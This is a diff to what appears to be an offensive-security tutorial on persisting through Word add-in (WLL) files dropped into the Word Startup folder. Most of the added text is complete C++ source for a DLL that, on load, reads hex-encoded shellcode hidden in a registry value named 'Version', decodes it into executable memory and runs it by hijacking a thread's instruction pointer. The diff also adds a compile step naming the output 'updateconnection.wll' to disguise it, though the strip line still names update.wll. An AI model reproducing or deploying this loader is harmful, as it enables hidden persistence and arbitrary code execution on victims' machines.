@@ -24,11 +24,12 @@ reg query x64 HKEY_CURRENT_USER\SOFTWARE\Microsoft\Office\14.0\Word\Security\Tru
 <img src="/img/p/office1.PNG" alt="Getting-gz" width="800" height="110"> 
 
 
-## navipage to this folder with the commond
+## navigate to this folder with the command
 ```
 cd C:\Users\NoRed0x\AppData\Roaming\Microsoft\Word\Startup
 ```
 
+<img src="/img/p/nav.PNG" alt="Getting-gz" width="800" height="110"> 
 
 
 ## shellcode2ascii.py
@@ -76,11 +77,85 @@ reg query x64 HKCU\SOFTWARE\Microsoft\Office\16.0\Word
 
 <img src="/img/p/5.PNG" alt="Getting-gz" width="800" height="200"> 
 
+## officetemp.cpp
+```
+#include <windows.h>
+#include <string>
+
+extern "C" {                                                                                                                                            
+__declspec(dllexport) void __cdecl go(void);
+}
+
+
+void GetRegistry(LPCSTR StringName, LPCSTR &valueBuffer, DWORD value_length)
+{
+	DWORD dwType = REG_SZ;
+	HKEY hKey = 0;
+	LPCSTR subkey = "SOFTWARE\\Microsoft\\Office\\16.0\\Word";
+	RegOpenKeyA(HKEY_CURRENT_USER,subkey,&hKey);
+	RegQueryValueExA(hKey, StringName, NULL, &dwType, (LPBYTE)valueBuffer, &value_length);
+
+}
+
+void go()
+{
+
+	DWORD dwRegistryEntryOneLen;
+	DWORD dwAllocationSize =  16384;
+
+	LPCSTR lpData = (LPCSTR)VirtualAlloc(NULL, dwAllocationSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
+
+	GetRegistry("Version", lpData, dwAllocationSize);
+
+	CONTEXT ctx;
+	SIZE_T bytesWritten;
+	ctx.ContextFlags = CONTEXT_FULL;
+
+	// We just allocate enough space it doesn't have to bre precise.
+	LPCSTR decodedShellcode = (LPCSTR)VirtualAlloc(NULL,dwAllocationSize, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+	// Decode the shellcode from ascii to binary format.
+	LPCSTR tempPointer = decodedShellcode;
+	for (int i = 0; i < dwAllocationSize/2; i ++) {
+		sscanf_s(lpData+(i*2), "%2hhx", &decodedShellcode[i]);
+	}
+	// We change the EIP later on.
+	HANDLE hThread = CreateThread(NULL, 4096, 0x0, NULL, CREATE_SUSPENDED, NULL);
+
+	// Get the current thread context.
+	GetThreadContext(hThread, &ctx);
+
+	// Set the EIP to point on our shellcode.
+	ctx.Eip = (DWORD)decodedShellcode;
+	//Change the context.
+	SetThreadContext(hThread, &ctx);
+	// Resume the thread.
+	ResumeThread(hThread);
+
+}
+
+BOOL APIENTRY DllMain( HMODULE hModule,
+                       DWORD  ul_reason_for_call,
+                       LPVOID lpReserved
+                                         )
+{
+        switch (ul_reason_for_call)
+        {
+        case DLL_PROCESS_ATTACH:
+                go();
+		return TRUE;
+        case DLL_THREAD_ATTACH:
+        case DLL_THREAD_DETACH:
+        case DLL_PROCESS_DETACH:
+                break;
+        }
+        return TRUE;
+}
+```
 
 ##  Compiling WLL
 compile the wll
 ```
-i686-w64-mingw32-g++ -Wno-narrowing -shared wlltemplate.cpp -o update.wll
+i686-w64-mingw32-g++ -Wno-narrowing -shared officetemp.cpp -o updateconnection.wll
 strip update.wll
 ```
 
